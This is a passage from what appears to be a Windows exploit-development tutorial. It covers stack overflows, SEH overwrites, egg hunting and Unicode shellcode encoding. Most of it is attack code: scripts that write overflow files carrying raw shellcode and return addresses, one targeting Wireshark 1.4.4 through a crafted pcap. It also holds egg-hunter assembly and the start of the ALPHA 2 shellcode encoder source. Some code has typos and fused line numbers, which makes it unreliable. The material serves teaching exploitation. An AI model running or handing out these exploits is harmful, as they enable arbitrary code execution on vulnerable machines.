&lt;&lt; &quot;\\nOK&quot;;&#125; 4.3 - Example: From C Language to C++We need to determine whether a buffer overflow vulnerability exists.123456789101112131415161718192021//vulnerable002.cpp#include &lt;iostream&gt;#include &lt;fstream&gt;using namespace std;void do_something(ifstream&amp; fin) &#123; char buf[1024]; fin &gt;&gt; buf;&#125;int main(int argc, char **argv) &#123; char dummy[1024]; ifstream fin; cout &lt;&lt; &quot;Vulnerable002 starts...\\n&quot;; if (argc&gt;=2) fin.open(argv[1]); if(fin) do_something(fin); cout &lt;&lt; &quot;Vulnerable002 ends...\\n&quot;;&#125;1234567891011121314151617//attack-vulnerable002.cpp#include &lt;string&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;using namespace std;#define EXPLOIT_FILENAME &quot;Vulnerable002-Exploit.txt&quot;int main() &#123; string junk(1100, &#x27;A&#x27;); ofstream fout(EXPLOIT_FILENAME); fout &lt;&lt; junk; cout &lt;&lt; &quot;Output file: &quot; &lt;&lt; EXPLOIT_FILENAME &lt;&lt; &quot;\\nOK&quot;;&#125; [EIP]=41414141. According to the result, a buffer overflow vulnerability exists. Determine the offset:1!mona pattern_create 1100 1!mona pattern_offset 69423569 Hence, the offset is 1036. Attack script:12345678910111213141516171819//attack-vulnerable002.cpp#include &lt;string&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;using namespace std;#define EXPLOIT_FILENAME &quot;Vulnerable002-Exploit.txt&quot;int main() &#123; string junk(1036, &#x27;A&#x27;); string eip(&quot;\\xef\\xbe\\xad\\xde&quot;); string postdata(&quot;BBBBCCCCDDDDEEEEFFFF&quot;); ofstream fout(EXPLOIT_FILENAME); fout &lt;&lt; junk &lt;&lt; eip &lt;&lt; postdata; cout &lt;&lt; &quot;Output file: &quot; &lt;&lt; EXPLOIT_FILENAME &lt;&lt; &quot;\\nOK&quot;;&#125; Our exploitation is successful. Now, we neeed to obtain the opcode of PUSH ESP # RET:1!mona jmp -r esp Here, we are going to use 0x7c836b80. This is the value for EIP. Thus, our exploit script is:1234567891011121314151617181920212223242526272829303132333435363738394041//attack-vulnerable002.cpp#include &lt;string&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;using namespace std;#define EXPLOIT_FILENAME &quot;Vulnerable002-Exploit.txt&quot;char buf[] = &quot;\\xb8\\xd7\\x13\\x93\\x1c\\xda\\xc3\\xd9\\x74\\x24\\xf4\\x5a\\x31\\xc9&quot;&quot;\\xb1\\x39\\x31\\x42\\x12\\x03\\x42\\x12\\x83\\x15\\x17\\x71\\xe9\\x65&quot;&quot;\\xf0\\xfa\\x12\\x95\\x01\\x65\\x9a\\x70\\x30\\xb7\\xf8\\xf1\\x61\\x07&quot;&quot;\\x8a\\x57\\x8a\\xec\\xde\\x43\\x9d\\x45\\x94\\x4d\\x2a\\xdb\\x01\\xa0&quot;&quot;\\xd3\\x2d\\x92\\x6e\\x17\\x2f\\x6e\\x6c\\x44\\x8f\\x4f\\xbf\\x99\\xce&quot;&quot;\\x88\\x76\\xd7\\x3f\\x44\\xdf\\x9c\\x92\\x79\\x54\\xe0\\x2e\\x7b\\xba&quot;&quot;\\x6e\\x0e\\x03\\xbf\\xb1\\xfb\\xbf\\xbe\\xe1\\x8f\\x08\\xd8\\x8a\\xc8&quot;&quot;\\xa8\\xd9\\x5f\\xb8\\x2d\\x10\\x2b\\x05\\x67\\x93\\x2b\\xfe\\x43\\x58&quot;&quot;\\xd2\\xd7\\x9d\\x9e\\x79\\x16\\x12\\x13\\x83\\x5e\\x95\\xcb\\xf6\\x94&quot;&quot;\\xe5\\x76\\x01\\x6f\\x97\\xac\\x84\\x70\\x3f\\x27\\x3e\\x55\\xc1\\xe4&quot;&quot;\\xd9\\x1e\\xcd\\x41\\xad\\x79\\xd2\\x54\\x62\\xf2\\xee\\xdd\\x85\\xd5&quot;&quot;\\x66\\xa5\\xa1\\xf1\\x23\\x7e\\xcb\\xa0\\x89\\xd1\\xf4\\xb3\\x76\\x8e&quot;&quot;\\x50\\xbf\\x95\\xd9\\xe5\\x40\\x66\\xe6\\xbb\\x56\\x92\\x18\\x44\\xa7&quot;&quot;\\xd0\\x6b\\x21\\xd5\\x29\\xb9\\x87\\x7d\\x22\\xd1\\xd7\\x15\\xf6\\x5e&quot;&quot;\\xfe\\xe2\\xf9\\x75\\x94\\xec\\xed\\x7c\\x69\\xed\\xed\\x3c\\x26\\xab&quot;&quot;\\xcd\\x94\\xdd\\x40\\x7a\\x14\\xf6\\xab\\x82\\x14\\x06\\xfc\\xe7\\x78&quot;&quot;\\x6a\\x93\\xc7\\xf7\\x1d\\x19\\x64\\x93\\xe1\\xb7\\x74\\x33\\xa7\\xc4&quot;&quot;\\x23\\xc4\\xd8\\x1e\\xa1\\xca\\x4e\\x51\\x83\\x68\\xd8\\x6e\\x39&quot;;int main() &#123; string junk(1036, &#x27;A&#x27;); string eip(&quot;\\x80\\x6b\\x83\\x7c&quot;); string debug(&quot;\\xcc\\xcc\\xcc\\xcc&quot;); string nops(8, &#x27;\\x90&#x27;); string shellcode(buf); ofstream fout(EXPLOIT_FILENAME, ios::binary); fout &lt;&lt; junk &lt;&lt; eip &lt;&lt; debug &lt;&lt; nops &lt;&lt; shellcode; cout &lt;&lt; &quot;Output file: &quot; &lt;&lt; EXPLOIT_FILENAME &lt;&lt; &quot;\\nOK&quot;;&#125; 4.4 - Example: Attacking Network Applications4.5 - Practice: KMPlayer4.6 - Practice: DVD X Player4.7 - Practice: Easy File Sharing FTP Server4.8 - Practice: Apple QuickTimeChapter 5 - Changes of Attacking5.1 - Principles of Exception Handling AttackWe build the following project with VC++12345678910111213141516//TestException.cpp#include &lt;cstdio&gt; //for printf()#include &lt;cstdlib&gt; //for system()int main() &#123; __try &#123; __asm&#123;NOP&#125; *(int*)0 = 0; &#125; __except(1) &#123; __asm&#123;NOP&#125; printf(&quot;got an exception\\n&quot;); &#125; system(&quot;pause&quot;);&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748//TestException2.cpp#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;Windows.h&gt;unsigned dummy;EXCEPTION_DISPOSITION__cdeclhandler_function( struct _EXCEPTION_RECORD *ExceptionRecord, void *EstablisherFrame, struct _CONSTEXT *ContextRecord, void *DispatcherContext)&#123; printf(&quot;This is our exception handler.&quot;); ContextRecord-&gt;Eax = (unsigned)&amp;dummy;&#125;int main() &#123; unsigned Handler = (unsigned)hander_function; __asm &#123; push Handler // Push Handler into stack. push FS:[0] // Push the address of ExceptionList into stack. mov FS:[0],ESP // move _EXCEPTION_REGISTRATION_RECORD to the beginning of the ExceptionList. &#125; __asm &#123; mov eax, 0 // Set EAX to be 0. mov [eax], 0 // Set [EAX] to be 0. /* This part of code is equivalent to: *(int*)0 = 0; */ &#125; printf(&quot;After handling\\n&quot;); __asm &#123; mov eax,[ESP] // Load Next into EAX mov FS:[0],EAX // Load EAX into ExceptionList add esp,8 // Clear stack. &#125; system(&quot;pause&quot;);&#125; 123456789101112131415//TestException3.cppint main() &#123; __asm &#123; push Handler //Push exception handler into stack. push FS:[0] //Push the current ExceptionList into stack. mov FS:[0],ESP //Load new _EXCEPTION_REGISTRATION_RECORD into ExceptionList &#125; *(int*)0 = 0; //Exception __asm &#123; Handler: //Exception handler INT 3 //Breakpoint &#125;&#125; Open TestException3.exe with Immunity Debugger. Press F9 to execute the program. Press Alt+S to show SEH chain after the program thrown the exception: Practice - Vulnerable001Here we use Vulnerable001.exe in Chapter 4. The following script is our new attack script:1234567891011121314151617//attack-vulnerable001-excp.cpp#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;fstream&gt;using namespace std;#define FILENAME &quot;Vulnerable001_Excp_Exploit.txt&quot;int main() &#123; string junk(1500, &#x27;A&#x27;); ofstream fout(FILENAME, ios::binary); fout &lt;&lt; junk; cout &lt;&lt; &quot;OK: &quot; &lt;&lt; FILENAME &lt;&lt; endl;&#125;Open it with Immunity Debugger and input the path of Vulnerable001-Excp-Exploit.txt: Press F9. Our program will be stopped. Press F9 to resume. EIP will be filled with 41414141: Press Alt+S to show SEH chain window. Notice that the SEH structure of SEH chain is also filled by 41414141: Now, we need to find the offset value with mona (We have done this many many times!):1!mona pattern_create 1500 Handler is replaced by 77423177 while Next is replaced by 42307742. Check the stack (0x0022FFE0): Notice that we almost reach the bottom. Which means we are not allowed to fill too much data between Next and Handler. A bunch of 1500 bytes data is meaningless since we cannot put all data into the stack. Find the offset of 42307742 (Next): And the offset of 77423177 (Handler). We modify the attack script:12345678910111213141516171819//attack-vulnerable001-excp.cpp#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;fstream&gt;using namespace std;#define FILENAME &quot;Vulnerable001_Excp_Exploit.txt&quot;int main() &#123; string junk(1440, &#x27;A&#x27;); string next(&quot;\\xcc\\xcc\\xcc\\xcc&quot;); string handler(&quot;\\xef\\xbe\\xad\\xde&quot;); ofstream fout(FILENAME, ios::binary); fout &lt;&lt; junk &lt;&lt; next &lt;&lt; handler; cout &lt;&lt; &quot;OK: &quot; &lt;&lt; FILENAME &lt;&lt; endl;&#125; 1!mona seh Final attack script:1234567891011121314151617181920212223242526272829303132333435363738394041//attack-vulnerable001-excp.cpp#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;fstream&gt;using namespace std;#define FILENAME &quot;Vulnerable001_Excp_Exploit.txt&quot;char buf[] = &quot;\\xb8\\xd7\\x13\\x93\\x1c\\xda\\xc3\\xd9\\x74\\x24\\xf4\\x5a\\x31\\xc9&quot;&quot;\\xb1\\x39\\x31\\x42\\x12\\x03\\x42\\x12\\x83\\x15\\x17\\x71\\xe9\\x65&quot;&quot;\\xf0\\xfa\\x12\\x95\\x01\\x65\\x9a\\x70\\x30\\xb7\\xf8\\xf1\\x61\\x07&quot;&quot;\\x8a\\x57\\x8a\\xec\\xde\\x43\\x9d\\x45\\x94\\x4d\\x2a\\xdb\\x01\\xa0&quot;&quot;\\xd3\\x2d\\x92\\x6e\\x17\\x2f\\x6e\\x6c\\x44\\x8f\\x4f\\xbf\\x99\\xce&quot;&quot;\\x88\\x76\\xd7\\x3f\\x44\\xdf\\x9c\\x92\\x79\\x54\\xe0\\x2e\\x7b\\xba&quot;&quot;\\x6e\\x0e\\x03\\xbf\\xb1\\xfb\\xbf\\xbe\\xe1\\x8f\\x08\\xd8\\x8a\\xc8&quot;&quot;\\xa8\\xd9\\x5f\\xb8\\x2d\\x10\\x2b\\x05\\x67\\x93\\x2b\\xfe\\x43\\x58&quot;&quot;\\xd2\\xd7\\x9d\\x9e\\x79\\x16\\x12\\x13\\x83\\x5e\\x95\\xcb\\xf6\\x94&quot;&quot;\\xe5\\x76\\x01\\x6f\\x97\\xac\\x84\\x70\\x3f\\x27\\x3e\\x55\\xc1\\xe4&quot;&quot;\\xd9\\x1e\\xcd\\x41\\xad\\x79\\xd2\\x54\\x62\\xf2\\xee\\xdd\\x85\\xd5&quot;&quot;\\x66\\xa5\\xa1\\xf1\\x23\\x7e\\xcb\\xa0\\x89\\xd1\\xf4\\xb3\\x76\\x8e&quot;&quot;\\x50\\xbf\\x95\\xd9\\xe5\\x40\\x66\\xe6\\xbb\\x56\\x92\\x18\\x44\\xa7&quot;&quot;\\xd0\\x6b\\x21\\xd5\\x29\\xb9\\x87\\x7d\\x22\\xd1\\xd7\\x15\\xf6\\x5e&quot;&quot;\\xfe\\xe2\\xf9\\x75\\x94\\xec\\xed\\x7c\\x69\\xed\\xed\\x3c\\x26\\xab&quot;&quot;\\xcd\\x94\\xdd\\x40\\x7a\\x14\\xf6\\xab\\x82\\x14\\x06\\xfc\\xe7\\x78&quot;&quot;\\x6a\\x93\\xc7\\xf7\\x1d\\x19\\x64\\x93\\xe1\\xb7\\x74\\x33\\xa7\\xc4&quot;&quot;\\x23\\xc4\\xd8\\x1e\\xa1\\xca\\x4e\\x51\\x83\\x68\\xd8\\x6e\\x39&quot;;int main() &#123; string next(&quot;\\xEB\\xF6&quot; &quot;\\x90\\x90&quot;); // jmp short -0x88 # NOP x 2 string handler(&quot;\\x4d\\x25\\x40\\x00&quot;); // 0040254d string shellcode(buf); string second_jumpcode(&quot;\\xE9\\xCF\\xFE\\xFF\\xFF&quot; &quot;\\x90\\x90\\x90&quot;); // jmp -0x12c # NOP x 3 string nops(1440 - shellcode.size() - second_jumpcode.size(), &#x27;\\x90&#x27;); ofstream fout(FILENAME, ios::binary); fout &lt;&lt; nops &lt;&lt; shellcode &lt;&lt; second_jumpcode &lt;&lt; next &lt;&lt; handler; cout &lt;&lt; &quot;OK: &quot; &lt;&lt; FILENAME &lt;&lt; endl;&#125; Practice - Wireshark 1.4.41 Offset of Handler: 1243Offset of Next: 1239 1!mona seh Here we use the address: ‘0x64F98F68’ (Don’t forget to check the bad chars for the address!) Thus, the attack script is:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596//Filename: attack-wireshark.cpp#include &lt;string&gt;#include &lt;iostream&gt;#include &lt;fstream&gt;using namespace std;typedef long int32;typedef short int16;typedef char int8;typedef unsigned long uint32;typedef unsigned short uint16;typedef unsigned char uint8;//PCAP Global Headertypedef __declspec(align(1)) struct pcap_hdr_s &#123; uint32 magic_number; uint16 version_major; uint16 version_minor; int32 thiszone; uint32 sigfigs; uint32 snaplen; uint32 network;&#125; pcap_hdr_t;//PCAP Packet Headertypedef __declspec(align(1)) struct pcaprec_hdr_s &#123; uint32 ts_sec; uint32 ts_usec; uint32 incl_len; uint32 orig_len;&#125; pcaprec_hdr_t;size_t const ETHER_ADDR_LEN = 6;//Ethernet II Headertypedef __declspec(align(1)) struct ether_hdr_s &#123; uint8 ether_dhost[ETHER_ADDR_LEN]; uint8 ether_short[ETHER_ADDR_LEN]; uint16 ether_type;&#125; ether_hdr_t;string const TEMPLATE_FILE = &quot;template.pcap&quot;;string const EXPLOIT_FILE = &quot;exploit.pcap&quot;;char buf[] = &quot;\\xb8\\xd7\\x13\\x93\\x1c\\xda\\xc3\\xd9\\x74\\x24\\xf4\\x5a\\x31\\xc9&quot;&quot;\\xb1\\x39\\x31\\x42\\x12\\x03\\x42\\x12\\x83\\x15\\x17\\x71\\xe9\\x65&quot;&quot;\\xf0\\xfa\\x12\\x95\\x01\\x65\\x9a\\x70\\x30\\xb7\\xf8\\xf1\\x61\\x07&quot;&quot;\\x8a\\x57\\x8a\\xec\\xde\\x43\\x9d\\x45\\x94\\x4d\\x2a\\xdb\\x01\\xa0&quot;&quot;\\xd3\\x2d\\x92\\x6e\\x17\\x2f\\x6e\\x6c\\x44\\x8f\\x4f\\xbf\\x99\\xce&quot;&quot;\\x88\\x76\\xd7\\x3f\\x44\\xdf\\x9c\\x92\\x79\\x54\\xe0\\x2e\\x7b\\xba&quot;&quot;\\x6e\\x0e\\x03\\xbf\\xb1\\xfb\\xbf\\xbe\\xe1\\x8f\\x08\\xd8\\x8a\\xc8&quot;&quot;\\xa8\\xd9\\x5f\\xb8\\x2d\\x10\\x2b\\x05\\x67\\x93\\x2b\\xfe\\x43\\x58&quot;&quot;\\xd2\\xd7\\x9d\\x9e\\x79\\x16\\x12\\x13\\x83\\x5e\\x95\\xcb\\xf6\\x94&quot;&quot;\\xe5\\x76\\x01\\x6f\\x97\\xac\\x84\\x70\\x3f\\x27\\x3e\\x55\\xc1\\xe4&quot;&quot;\\xd9\\x1e\\xcd\\x41\\xad\\x79\\xd2\\x54\\x62\\xf2\\xee\\xdd\\x85\\xd5&quot;&quot;\\x66\\xa5\\xa1\\xf1\\x23\\x7e\\xcb\\xa0\\x89\\xd1\\xf4\\xb3\\x76\\x8e&quot;&quot;\\x50\\xbf\\x95\\xd9\\xe5\\x40\\x66\\xe6\\xbb\\x56\\x92\\x18\\x44\\xa7&quot;&quot;\\xd0\\x6b\\x21\\xd5\\x29\\xb9\\x87\\x7d\\x22\\xd1\\xd7\\x15\\xf6\\x5e&quot;&quot;\\xfe\\xe2\\xf9\\x75\\x94\\xec\\xed\\x7c\\x69\\xed\\xed\\x3c\\x26\\xab&quot;&quot;\\xcd\\x94\\xdd\\x40\\x7a\\x14\\xf6\\xab\\x82\\x14\\x06\\xfc\\xe7\\x78&quot;&quot;\\x6a\\x93\\xc7\\xf7\\x1d\\x19\\x64\\x93\\xe1\\xb7\\x74\\x33\\xa7\\xc4&quot;&quot;\\x23\\xc4\\xd8\\x1e\\xa1\\xca\\x4e\\x51\\x83\\x68\\xd8\\x6e\\x39&quot;;int main() &#123; pcap_hdr_t global_header; pcaprec_hdr_t packet_header; ether_hdr_t ether_header; size_t const OFFSET_LEN = 1239; string nops(OFFSET_LEN, &#x27;\\x90&#x27;); string next = &quot;\\xEB\\x0A\\x90\\x90&quot;; // JMP SHORT 0x0C (EB0A) # NOPx2 string handler = &quot;\\x68\\x8f\\xf9\\x64&quot;; // 64F98F68 string slide(50, &#x27;\\x90&#x27;); string shellcode(buf); string exploit = nops + next + handler + slide + shellcode; ifstream fin(TEMPLATE_FILE.c_str(), ios::binary); fin.read((char*)&amp;global_header, sizeof(global_header)). read((char*)&amp;packet_header, sizeof(packet_header)). read((char*)&amp;ether_header, sizeof(ether_header)); packet_header.incl_len = packet_header.orig_len = sizeof(ether_header) + exploit.size(); ether_header.ether_type = 0x2323; ofstream fout(EXPLOIT_FILE.c_str(), ios::binary); fout.write((char*)&amp;global_header, sizeof(global_header)). write((char*)&amp;packet_header, sizeof(packet_header)). write((char*)&amp;ether_header, sizeof(ether_header)) &lt;&lt; exploit; cout &lt;&lt; &quot;OK: &quot; &lt;&lt; EXPLOIT_FILE &lt;&lt; endl;&#125; 5.2 - Egg HuntNtDisplayString123456789101112131415161718192021222324252627282930loop_inc_page: or dx,0x0fffloop_inc_one: inc edxloop_check: push edx push 0x43 pop eax int 0x2e cmp al,0x05 pop edxloop_check_8_valid: je loop_inc_pageis_egg: mov eax,0x50905090 mov edi,edx scasd jnz loop_inc_one scasd jnz loop_inc_onematched: jmp edi WinDbg:1lkd&gt; dds nt!KeServiceDescriptorTable L4 lkd: Local Kernel Debug dds: display dword symbol 1lkd&gt; dds nt!KiServiceTable NtAccessCheckAndAlarm123456789101112131415161718192021222324252627282930loop_inc_page: or dx, 0x0fffloop_inc_one: inc edxloop_check: push edx push 0x02 pop eax int 0x2e cmp al,0x05 pop edxloop_check_8_valid: je loop_inc_pageis_egg: mov eax, 0x50905090 mov edi,edx scasd jnz loop_inc_one scasd jnz loop_inc_onematched: jmp edi Egg Hunt Practice 123456789101112131415161718192021222324//vulnerable004.c#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main(int argc, char *argv[]) &#123; FILE *pFile; char *long_buffer; char short_buf[64]; printf(&quot;Vulnerable004 starts...\\n&quot;); if (argc &gt;= 2) pFile = fopen(argv[1], &quot;r&quot;); if (pFile) &#123; long_buffer = malloc(2048); fscanf(pFile, &quot;%s&quot;, long_buffer); //do something free(long_buffer); fscanf(pFile, &quot;%s&quot;, short_buf); &#125; printf(&quot;Vulnerable004 ends...\\n&quot;);&#125; 1234567891011121314151617181920//attack-vulnerable004.cpp#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;using namespace std;string const OUTPUT_FILE = &quot;exploit-vulnerable004.txt&quot;;int main() &#123; ofstream fout(OUTPUT_FILE.c_str()); string junk1(1000, &#x27;A&#x27;); string junk2(200, &#x27;B&#x27;); fout &lt;&lt; junk1 &lt;&lt; &#x27;\\n&#x27; &lt;&lt; junk2 &lt;&lt; endl; cout &lt;&lt; &quot;OK: &quot; &lt;&lt; OUTPUT_FILE &lt;&lt; endl;&#125; 1!mona jmp -r esp Exploit script:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748//attack-vulnerable004.cpp#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;using namespace std;string const OUTPUT_FILE = &quot;exploit-vulnerable004.txt&quot;;char eggcode[] = &quot;\\xb8\\xd7\\x13\\x93\\x1c\\xda\\xc3\\xd9\\x74\\x24\\xf4\\x5a\\x31\\xc9&quot;&quot;\\xb1\\x39\\x31\\x42\\x12\\x03\\x42\\x12\\x83\\x15\\x17\\x71\\xe9\\x65&quot;&quot;\\xf0\\xfa\\x12\\x95\\x01\\x65\\x9a\\x70\\x30\\xb7\\xf8\\xf1\\x61\\x07&quot;&quot;\\x8a\\x57\\x8a\\xec\\xde\\x43\\x9d\\x45\\x94\\x4d\\x2a\\xdb\\x01\\xa0&quot;&quot;\\xd3\\x2d\\x92\\x6e\\x17\\x2f\\x6e\\x6c\\x44\\x8f\\x4f\\xbf\\x99\\xce&quot;&quot;\\x88\\x76\\xd7\\x3f\\x44\\xdf\\x9c\\x92\\x79\\x54\\xe0\\x2e\\x7b\\xba&quot;&quot;\\x6e\\x0e\\x03\\xbf\\xb1\\xfb\\xbf\\xbe\\xe1\\x8f\\x08\\xd8\\x8a\\xc8&quot;&quot;\\xa8\\xd9\\x5f\\xb8\\x2d\\x10\\x2b\\x05\\x67\\x93\\x2b\\xfe\\x43\\x58&quot;&quot;\\xd2\\xd7\\x9d\\x9e\\x79\\x16\\x12\\x13\\x83\\x5e\\x95\\xcb\\xf6\\x94&quot;&quot;\\xe5\\x76\\x01\\x6f\\x97\\xac\\x84\\x70\\x3f\\x27\\x3e\\x55\\xc1\\xe4&quot;&quot;\\xd9\\x1e\\xcd\\x41\\xad\\x79\\xd2\\x54\\x62\\xf2\\xee\\xdd\\x85\\xd5&quot;&quot;\\x66\\xa5\\xa1\\xf1\\x23\\x7e\\xcb\\xa0\\x89\\xd1\\xf4\\xb3\\x76\\x8e&quot;&quot;\\x50\\xbf\\x95\\xd9\\xe5\\x40\\x66\\xe6\\xbb\\x56\\x92\\x18\\x44\\xa7&quot;&quot;\\xd0\\x6b\\x21\\xd5\\x29\\xb9\\x87\\x7d\\x22\\xd1\\xd7\\x15\\xf6\\x5e&quot;&quot;\\xfe\\xe2\\xf9\\x75\\x94\\xec\\xed\\x7c\\x69\\xed\\xed\\x3c\\x26\\xab&quot;&quot;\\xcd\\x94\\xdd\\x40\\x7a\\x14\\xf6\\xab\\x82\\x14\\x06\\xfc\\xe7\\x78&quot;&quot;\\x6a\\x93\\xc7\\xf7\\x1d\\x19\\x64\\x93\\xe1\\xb7\\x74\\x33\\xa7\\xc4&quot;&quot;\\x23\\xc4\\xd8\\x1e\\xa1\\xca\\x4e\\x51\\x83\\x68\\xd8\\x6e\\x39&quot;;char huntercode[] =&quot;\\x66\\x81\\xCA\\xFF\\x0F\\x42\\x52\\x6A\\x02\\x58\\xCD\\x2E\\x3C\\x05\\x5A\\x74\\xEF\\xB8&quot;&quot;R0CK&quot;&quot;\\x8B\\xFA\\xAF\\x75\\xEA\\xAF\\x75\\xE7\\xFF\\xE7&quot;;int main() &#123; size_t const RET_OFFSET = 84; ofstream fout(OUTPUT_FILE.c_str()); string egg(eggcode); string padding(RET_OFFSET, &#x27;A&#x27;); string ret(&quot;\\x13\\x4f\\x87\\x7c&quot;); //7C874F13 string hunter(huntercode); fout &lt;&lt; &quot;R0CKR0CK&quot; &lt;&lt; egg &lt;&lt; &#x27;\\n&#x27; &lt;&lt; padding &lt;&lt; ret &lt;&lt; hunter; cout &lt;&lt; &quot;OK: &quot; &lt;&lt; OUTPUT_FILE &lt;&lt; endl;&#125; Egg Hunt Practice——Kolibri Web Server5.3 – Unicode-Based Exploitation TechniquesPrincipleA = \\x41 in ASCII representationA = \\x00\\x41 in Unicode (UTF-16LE) representation, where \\x00 is the null byte. When converting from ASCII to Unicode, values from \\x00 to \\x7F remain unchanged, except that they are prefixed with \\x00.On the other hand, values from \\x80 to \\xFF may be converted differently depending on the code page. Consequently, only values from \\x00 to \\x7F are suitable for buffer overflow exploitation, since these values remain consistent across different Windows systems, even when different language settings are used.In contrast, values from \\x80 to \\xFF are unpredictable. We can use Alpha 2 (Berend-Jan Wever) to solve these problem:Alpha 2123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407//Author: Berend-Jan Wever#include &lt;stdio.h&gt; // printf(), fprintf(), stderr#include &lt;stdlib.h&gt; // exit(), EXIT_SUCCESS, EXIT_FAILURE, srand(), rand()#include &lt;string.h&gt; // strcasecmp(), strstr()#include &lt;sys/time.h&gt; //struct timeval, struct timezone, gettimeofday()#define VERSION_STRING &quot;ALPHA 2: Zero-tolerance. (build 07)&quot;#define COPYRIGHT &quot;Copyright (C) 2003, 2004 by Berend-Jan Wever.&quot;/*________________________________________________________________________________ ,sSSs,,s, ,sSSSs, ALPHA 2: Zero-tolerance. SS&quot; Y$P&quot; SY&quot; ,SY iS&#x27; dY ,sS&quot; Unicode-proof uppercase alphanumeric shellcode encoding. YS, dSb ,sY&quot; Copyright (C) 2003, 2004 by Berend-Jan Wever. `&quot;YSS&#x27;&quot;S&#x27; &#x27;SSSSSSSP &lt;skylined@edup.tudelft.nl&gt;________________________________________________________________________________ This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License version 2, 1991 as published by the Free Software Foundation. This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details. A copy of the GNU General Public License can be found at: http://www.gnu.org/licenses/gpl.html or you can write to: Free Software Foundation, Inc. 59 Temple Place - Suite 330 Boston, MA 02111-1307 USA.Acknowledgements: Thanks to rix for his phrack article on aphanumeric shellcode. Thanks to obscou for his phrack article on unicode-proof shellcode. Thanks to Costin Ionescu for the idea behind w32 SEH GetPC code. Thanks to spoonm for inspiration and suggestions, check out his 1337 perl conversion of ALPHA in the metasploit framework (with polymorphism!)*/#define mixedcase_w32sehgetpc &quot;VTX630VXH49HHHPhYAAQhZYYYYAAQQDDDd36&quot; \\ &quot;FFFFTXVj0PPTUPPa301089&quot;#define uppercase_w32sehgetpc &quot;VTX630WTX638VXH49HHHPVX5AAQQPVX5YYYY&quot; \\ &quot;P5YYYD5KKYAPTTX638TDDNVDDX4Z4A638618&quot; \\ &quot;16&quot;#define mixedcase_ascii_decoder_body &quot;jAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI&quot;#define uppercase_ascii_decoder_body &quot;VTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0B&quot; \\ &quot;BXP8ACJJI&quot;#define mixedcase_unicode_decoder_body &quot;jXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIA&quot; \\ &quot;IAJ11AIAIABABABQI1AIQIAIQI111AIAJQYA&quot; \\ &quot;ZBABABABABkMAGB9u4JB&quot;#define uppercase_unicode_decoder_body &quot;QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5&quot; \\ &quot;AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABAB&quot; \\ &quot;QI1AIQIAIQI1111AIAJQI1AYAZBABABABAB3&quot; \\ &quot;0APB944JB&quot;struct decoder &#123; char* id; // id of option char* code; // the decoder&#125; mixedcase_ascii_decoders[] = &#123; &#123; &quot;nops&quot;, &quot;IIIIIIIIIIIIIIIIII7&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;eax&quot;, &quot;PYIIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;ecx&quot;, &quot;IIIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;edx&quot;, &quot;JJJJJJJJJJJJJJJJJ7RY&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;ebx&quot;, &quot;SYIIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;esp&quot;, &quot;TYIIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;ebp&quot;, &quot;UYIIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;esi&quot;, &quot;VYIIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;edi&quot;, &quot;WYIIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;[esp-10]&quot;, &quot;LLLLLLLLLLLLLLLLYIIIIIIIIIQZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;[esp-C]&quot;, &quot;LLLLLLLLLLLLYIIIIIIIIIIIQZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;[esp-8]&quot;, &quot;LLLLLLLLYIIIIIIIIIIIIIQZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;[esp-4]&quot;, &quot;LLLLYIIIIIIIIIIIIIIIQZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;[esp]&quot;, &quot;YIIIIIIIIIIIIIIIIIQZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;[esp+4]&quot;, &quot;YYIIIIIIIIIIIIIIII7QZ&quot; mixedcase_ascii_decoder_body &#125;, &#123; &quot;[esp+8]&quot;, &quot;YYYIIIIIIIIIIIIIIIIQZ&quot; mixedcase_ascii_decoder_body &#125;, 